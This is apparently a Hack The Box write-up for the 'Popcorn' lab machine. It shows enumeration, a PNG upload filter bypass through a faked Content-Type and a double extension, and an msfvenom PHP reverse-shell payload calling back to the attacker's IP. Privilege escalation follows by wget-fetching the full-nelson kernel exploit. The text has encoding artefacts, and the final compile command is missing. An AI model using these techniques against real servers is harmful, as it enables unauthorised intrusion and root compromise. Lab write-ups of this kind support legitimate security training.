I"<ul>
  <li>Box: Popcorn
    <ul>
      <li>Difficulty: Medium</li>
      <li>Points: 20</li>
      <li>Release: 15 Mar 2017</li>
      <li>IP: 10.10.10.6</li>
    </ul>
  </li>
</ul>

<p>###Initial Enumeration</p>

<p>####1.Nmap Scanning</p>

<p>Starting with a scan of the target ip address:</p>

<p><code class="highlighter-rouge">nmap -sC -sV -oA popcorn.nmap 10.10.10.6</code></p>

<p>We can see 22 and 80 are open. Letâ€™s navigate to the web browser and access the webpage on port 80.</p>

<p><img src="/images/posts/htb/popcorn/popcorn1.jpg" /></p>

<p>####Directory Enumeration</p>

<p>Running Dirbuster with the lowercase medium directory list shows us a directory called â€œtorrentâ€. So letâ€™s navigate to that directory in the browser.</p>

<p><img src="/images/posts/htb/popcorn/popcorn2.jpg" /></p>

<p>After navigating to the page, we see that we can sign up and upload only <strong>.torrent</strong> files</p>

<p>###Exploitation</p>

<p>####Testing what we can do/not do with uploads</p>

<p>Letâ€™s upload a test .torrent file and see what happens:</p>

<p><img src="/images/posts/htb/popcorn/popcorn3.jpg" /></p>

<p>Note that after submitting the file, we can see an â€œEdit Settingsâ€ option. Clicking this shows us the ability to upload screenshots in PNG format.</p>

<p><img src="/images/posts/htb/popcorn/popcorn5.jpg" /></p>

<p><img src="/images/posts/htb/popcorn/popcorn4.jpg" /></p>

<p><img src="/images/posts/htb/popcorn/popcorn9.jpg" /></p>

<p>This upload has 2 checks. It will confirm the uploaded file matches valid image extensions and it will check the POST data <strong>Content-Type</strong> is set to <strong>image/png</strong>.</p>

<p>Simply create a reverse shell payload and name it something like â€œwrite.png.phpâ€
This command will generate one for you:</p>

<p><code class="highlighter-rouge">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.9 lport=444 -f raw</code></p>

<p>Load up BurpSuite to intercept the file transfer. This will allow us to edit the parameters before they are forwarded to the web server.</p>

<p>Upload this file in the â€œEdit Settingsâ€ option as if it were a screenshot.</p>

<p>Your burpsuite should something like the below. You will want to change â€œapplication/phpâ€ to â€œimage/pngâ€ and remove the â€œ.pngâ€ portion from the filename.</p>

<p><img src="/images/posts/htb/popcorn/popcorn8.jpg" /></p>

<p>Our DirBuster results show a  â€œtorrentsâ€ directory. Navigating to that shows us another â€œuploadâ€ directory within. Here we can see a list of all file uploads.</p>

<p>Next, weâ€™re going to set up a listener and capture the reverse_tcp shell.</p>

<p>####Metasploit</p>

<p>Load up metasploit and set a listener for the php/meterpreter/reverse_tcp payload you just uploaded.</p>

<p><img src="/images/posts/htb/popcorn/popcorn7.jpg" /></p>

<p>Once the listener is started, you can go ahead and click on the file in the â€œ/torrent/uploadâ€ directory.
This should execute the file you uploaded and establish a connection back to your metasploit listener.
<img src="/images/posts/htb/popcorn/popcorn6.jpg" />
Once weâ€™re in, the user flag can be found at <strong>/home/george/user.txt</strong></p>

<p><img src="/images/posts/htb/popcorn/popcorn11.jpg" /></p>

<p>###Privilege Escalation</p>

<p>Getting root is fairly trivial, we can use the known exploit called â€œfull-nelsonâ€.</p>

<p>We just need a way to get the C code for the exploit onto this machine.</p>

<p>More information on that exploit here: <a href="https://www.exploit-db.com/exploits/15704">exploits/15704</a></p>

<p>I just went ahead and setup a â€œ<strong>python -m SimpleHTTPServer</strong>â€ and used â€œ<strong>wget</strong>â€ to pull the file from my attacking box.</p>

<p>Once the file is present, compile it and run it like so:</p>

<p>You will get a root shell and can find the root flag in <strong>/root/root.txt</strong></p>

<p><img src="/images/posts/htb/popcorn/popcorn10.jpg" /></p>
:ET